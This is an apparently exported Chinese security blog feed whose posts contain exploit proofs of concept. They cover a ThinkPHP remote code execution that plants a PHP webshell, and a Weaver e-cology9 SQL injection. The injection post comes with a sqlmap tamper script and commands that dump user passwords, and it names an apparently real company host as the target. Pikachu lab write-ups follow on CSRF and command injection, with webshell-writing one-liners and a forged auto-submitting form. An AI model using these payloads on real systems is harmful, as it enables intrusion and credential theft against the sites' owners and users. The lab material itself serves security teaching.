<h5 id="post包"><a href="#post包" class="headerlink" title="post包"></a>post包</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Cookie: PHPSESSID=good123123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 110</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518001530147.png" alt="image-20230518001530147"></p>
<h5 id="可以查看一下tmp目录"><a href="#可以查看一下tmp目录" class="headerlink" title="可以查看一下tmp目录"></a>可以查看一下tmp目录</h5><p>看一下是否成功写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 77</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls /tmp</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518001551800.png" alt="image-20230518001551800"></p>
<h3 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h3><p><img src="/images/image-20230518001621137.png" alt="image-20230518001621137"></p>
<h5 id="设置body"><a href="#设置body" class="headerlink" title="设置body"></a>设置body</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_good123123</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230518001404974.png" alt="image-20230518001404974"></p>
<h5 id="成功连接"><a href="#成功连接" class="headerlink" title="成功连接"></a>成功连接</h5><p><img src="/images/image-20230518001431455.png" alt="image-20230518001431455"></p>
<h5 id="看一下sess-xxxxxxxxx文件中的内容"><a href="#看一下sess-xxxxxxxxx文件中的内容" class="headerlink" title="看一下sess_xxxxxxxxx文件中的内容"></a>看一下sess_xxxxxxxxx文件中的内容</h5><p><img src="/images/image-20230518092101501.png" alt="image-20230518092101501"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">think|a:2:&#123;s:28:&quot;&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;&quot;;s:0:&quot;&quot;;s:0:&quot;&quot;;s:0:&quot;&quot;;&#125;d2d977c58444271d9c780187e93f80e5|a:2:&#123;s:11:&quot;verify_code&quot;;s:32:&quot;5e3e4963c40c376ff421127ae4342bab&quot;;s:11:&quot;verify_time&quot;;i:1684371746;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>POC</category>
      </categories>
  </entry>
  <entry>
    <title>泛微e-cology9 browser.jsp SQL注入</title>
    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keywordspan><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>

<p>sql语句经过了三层全字符的url编码</p>
<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keywordspan><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>

<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>

<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
  </entry>
  <entry>
    <title>win10启用administrator</title>
    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/win10%E5%90%AF%E7%94%A8administrator/</url>
    <content><![CDATA[<h2 id="激活administrator"><a href="#激活administrator" class="headerlink" title="激活administrator"></a>激活administrator</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> net user administrator /active:yes</span><br></pre></td></tr></table></figure>

<p>管理员权限启用命令行</p>
<p><img src="/images/1662534726671-48bd504b-690d-49e2-8b0f-f1ac984568e5.png"></p>
<h2 id="计算机管理"><a href="#计算机管理" class="headerlink" title="计算机管理"></a>计算机管理</h2><p>在计算机管理中看到administrator用户已启用(其实可以直接在这改)</p>
<p><img src="/images/1662535027870-6e98440a-1d08-4641-af33-7ef4bcf013c7.png"></p>
<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><h5 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h5><p>管理员权限运行CMD</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user administrator xxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p><img src="/images/1662535437611-72be8af6-7237-4a5b-b9dd-b3da34e8b886.png"></p>
<h5 id="图形化"><a href="#图形化" class="headerlink" title="图形化"></a>图形化</h5><p><img src="/images/1662535563235-10d0e3e8-88b4-4778-a761-44c1e88f2c57.png"></p>
<p><img src="/images/1662535652493-99ed1d08-eed3-44f2-8e38-acacb8d70caf.png"></p>
]]></content>
      <categories>
        <category>windows相关</category>
      </categories>
  </entry>
  <entry>
    <title>windows中的cat命令</title>
    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/windows%E4%B8%AD%E7%9A%84cat%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="命令行查看文本内容"><a href="#命令行查看文本内容" class="headerlink" title="命令行查看文本内容"></a>命令行查看文本内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type filename</span><br></pre></td></tr></table></figure>

<p><img src="/images/2022-11-18-14-33-44-image.png"></p>
]]></content>
      <categories>
        <category>windows相关</category>
      </categories>
  </entry>
  <entry>
    <title>判断windows是物理机还是虚拟机</title>
    <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/%E5%88%A4%E6%96%ADwindows%E6%98%AF%E7%89%A9%E7%90%86%E6%9C%BA%E8%BF%98%E6%98%AF%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    <content><![CDATA[<h3 id="111"><a href="#111" class="headerlink" title="111"></a>111</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Systeminfo | findstr /i &quot;BIOS&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230417095630088.png" alt="image-20230417095630088"></p>
<h3 id="222"><a href="#222" class="headerlink" title="222"></a>222</h3><p>powershell命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell get-wmiobject win32_computersystem</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230417095750129.png" alt="image-20230417095750129"></p>
]]></content>
      <categories>
        <category>windows相关</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-CSRF</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/CSRF/</url>
    <content><![CDATA[<h1 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h1><p>CSRF(Cross-Site Request Forgery)跨站请求伪造</p>
<p>在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击</p>
<p>看上去和XSS钓鱼的方式差不多，其实不一样</p>
<p>可以这么来理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p>
<p>比如现在有一个更改密码的请求，发送的数据包是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /changepass?pass=123456</span><br><span class="line">Host: x.x.x.x</span><br></pre></td></tr></table></figure>

<p>但是攻击者并没有更改密码的权限</p>
<p>于是构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://x.x.x.x/changepass?pass=123456</span><br></pre></td></tr></table></figure>

<p>发送给具备权限的用户，如果用户的后台处于登录状态，当点击该url时，则会触发更改密码的请求</p>
<p>所以可以看出其和XSS的区别，XSS不一定需要权限，或已经获得权限</p>
<p>而CSRF是借助别人的权限，执行正常的请求完成想要的攻击</p>
<p>CSRF中的C，可以理解为指的是被攻击者的浏览器，因为该攻击主要针对的就是被攻击者浏览器上所含有的权限</p>
<h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p><img src="/images/image-20230109101126846.png" alt="image-20230109101126846"></p>
<p>根据提示随便登录一个账户</p>
<p><img src="/images/image-20230109101420309.png" alt="image-20230109101420309"></p>
<p>修改个人信息</p>
<p><img src="/images/image-20230109101557343.png" alt="image-20230109101557343"></p>
<p>可以获取更改个人信息的url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>替换为想要更改的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=13888888888&amp;add=tianjin&amp;email=admin%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>然后登录其他的账户</p>
<p>此时的用户信息还是原先的信息</p>
<p><img src="/images/image-20230109101755800.png" alt="image-20230109101755800"></p>
<p>访问更改信息的url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=13888888888&amp;add=tianjin&amp;email=admin%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>刷新后可以看到kobe的用户信息已经更改</p>
<p><img src="/images/image-20230109101852497.png" alt="image-20230109101852497"></p>
<h1 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h1><p>POST类型的CSRF和GET的主要区别就是请求方式不同，从而导致发送的参数的位置不同。</p>
<p>GET的参数位置在URL的”?”后面</p>
<p>POST的参数在请求包的body中</p>
<p>由于POST的body无法直接发送给被攻击者，所以在利用POST的CSRF攻击时，需要自己构造一个html用于让被攻击者点击</p>
<p><img src="/images/image-20230109102350260.png" alt="image-20230109102350260"></p>
<p>根据提示随意登录一个用户</p>
<p>抓取更改用户信息的请求包</p>
<p><img src="/images/image-20230109102501800.png" alt="image-20230109102501800"></p>
<p>构造恶意网页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload = function() &#123;</span><br><span class="line">  document.getElementById(&quot;postsubmit&quot;).click();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt;</span><br><span class="line">    &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;ggg&quot; /&gt;</span><br><span class="line">    &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;13888888888&quot; /&gt;</span><br><span class="line">    &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;tianjing&quot; /&gt;</span><br><span class="line">    &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;admin@qq.com&quot; /&gt;</span><br><span class="line">    &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>该html会POST如下参数到<a href="http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfpost/csrf_post_edit.php">http://127.0.0.1:88/DX/pikachu/vul/csrf/csrfpost/csrf_post_edit.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=ggg&amp;phonenum=13888888888&amp;add=tianjing&amp;email=admin%40qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>保存为test.html放置在自己的服务器</p>
<p><img src="/images/image-20230109102848481.png" alt="image-20230109102848481"></p>
<p>登录其他用户，此时信息还是原先的</p>
<p><img src="/images/image-20230109102933534.png" alt="image-20230109102933534"></p>
<p>访问恶意url</p>
<p><a href="http://127.0.0.1:88/test.html">http://127.0.0.1:88/test.html</a></p>
<p>刷新后用户信息已更改</p>
<p><img src="/images/image-20230109103037574.png" alt="image-20230109103037574"></p>
<h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h1><p>同样先按之前的步骤，登录，修改，抓包</p>
<p><img src="/images/image-20230109103833397.png" alt="image-20230109103833397"></p>
<p>可以发现和前两题相比，多出了一个token字段</p>
<p>该token在页面源代码中可以找到</p>
<p><img src="/images/image-20230109104040210.png" alt="image-20230109104040210"></p>
<p>而且该token在每次刷新时都会变化</p>
<p>所以并不能通过固定token实施攻击</p>
<p>但是在本地利用是可以的，可以借助burp的插件</p>
<p>在burp的应用市场就能下载，可以顺便下载下logger++</p>
<p><img src="/images/image-20230112151506245.png" alt="image-20230112151506245"></p>
<h3 id="CSRF-Token-Tracker"><a href="#CSRF-Token-Tracker" class="headerlink" title="CSRF Token Tracker"></a>CSRF Token Tracker</h3><p>可以先正常重发数据包看看</p>
<p>如果修改成功，状态码会为302，返回上层页面</p>
<p><img src="/images/image-20230112150010861.png" alt="image-20230112150010861"></p>
<p>再次重发，修改失败，没有重定向到上层页面</p>
<p><img src="/images/image-20230112150051584.png" alt="image-20230112150051584"></p>
<p>下面使用CSRF Token Tracker自动更新Token</p>
<p>设置CSRF Token Tracker，添加host和Name</p>
<p>Name就是请求包中指定token的字段</p>
<p><img src="/images/image-20230112150402891.png" alt="image-20230112150402891"></p>
<p><img src="/images/image-20230112151052925.png" alt="image-20230112151052925"></p>
<p>配置完成后再次返回repeater发包</p>
<p>此时都为302,修改成功</p>
<p><img src="/images/image-20230112151130778.png" alt="image-20230112151130778"></p>
<p>注意，在repeater中并不会看见token的变化</p>
<p>可以借助logger++插件</p>
<p><img src="/images/image-20230112151526121.png" alt="image-20230112151526121"></p>
<p>可以发现每一个token的值都不同</p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-RCE</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
    <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
<p>也叫做远程命令执行或远程代码执行</p>
<p>在实际中这可以归为最严重的漏洞，因为其可以获取到服务器权限</p>
<p>一些反序列化，远程调用等，只要能够执行系统命令，都可以归为RCE</p>
<p>比如log4j</p>
<h1 id="ping-RCE"><a href="#ping-RCE" class="headerlink" title="ping RCE"></a>ping RCE</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110095547449.png" alt="image-20230110095547449"></p>
<p>此时在服务器上执行的命令为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>

<p>然后将结果显示在前端</p>
<p>于是我们可以构造命令拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com&amp;&amp;whoami</span><br></pre></td></tr></table></figure>

<p>&amp;&amp;就是“与”</p>
<p><img src="/images/image-20230110095812452.png" alt="image-20230110095812452"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a||whoami</span><br></pre></td></tr></table></figure>

<p>||就是“或”</p>
<p><img src="/images/image-20230110095858437.png" alt="image-20230110095858437"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令A &amp;&amp; 命令B			# 只有前面的命令执行成功后才会执行后面的命令</span><br><span class="line">命令A &amp; 命令B			# 无论前面的命令执行成功或失败，总会执行后面的命令</span><br><span class="line">命令A || 命令B			# 当前面的命令执行失败才会执行后面的命令</span><br><span class="line">命令A | 命令B			# 前面的命令执行的输出作为后面命令执行的输入</span><br><span class="line">命令A ; 命令B			# 两条命令互不干扰</span><br></pre></td></tr></table></figure>

<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Windows</span><br><span class="line">	# 使用 ^ 对 &lt; 进行转义</span><br><span class="line">	echo ^&lt;?php @eval($_POST[x])?^&gt; &gt; /xxx/xxx/x.php</span><br><span class="line"></span><br><span class="line">- Linux</span><br><span class="line">	# 将一句话马转换为十六进制</span><br><span class="line">	原: &lt;?php @eval($_POST[x]);?&gt;</span><br><span class="line">	现: echo 3c3f70687020406576616c28245f504f53545b785d293f3e|xxd -r -ps  &gt; /xxx/xxx/x.php</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看一下服务端的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">                $result.=shell_exec(&#x27;ping -c 4 1.1.1.1 &amp; whoami);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接通过shell_exec执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br></pre></td></tr></table></figure>

<p>没有任何过滤，所以可以造成拼接</p>
<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110100607751.png" alt="image-20230110100607751"></p>
<h1 id="eval-RCE"><a href="#eval-RCE" class="headerlink" title="eval RCE"></a>eval RCE</h1><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>可以看下源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;txt&#x27;] != null)&#123;</span><br><span class="line">    if(@!eval($_POST[&#x27;txt&#x27;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>@表示忽略报错</p>
<p>!表示“非”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@!eval()</span><br></pre></td></tr></table></figure>

<p>在命令执行时就会返回1(无论是否执行成功)，表示ture，输出“你喜欢的字符还挺奇怪的!”</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接执行php代码即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110101728753.png" alt="image-20230110101728753"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-敏感信息泄露</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
<p>成功登录</p>
<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
<p>并且发现，该后台为未授权接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>

<p>不需要登录也能访问</p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-SSRF</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/</url>
    <content><![CDATA[<h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><h3 id="服务端请求伪造"><a href="#服务端请求伪造" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>字面意思就是伪造一个服务端请求，即攻击者借由服务端为跳板来攻击目标系统。</p>
<p><img src="/images/image-20230110155943810.png" alt="image-20230110155943810"></p>
<p>即我们能够访问到服务器，却访问不到目标机，但是服务器能访问到目标机</p>
<p>比如</p>
<p>服务器是某公司的公网边界机，目标机是该公司的内网机器</p>
<h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><p>利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等</p>
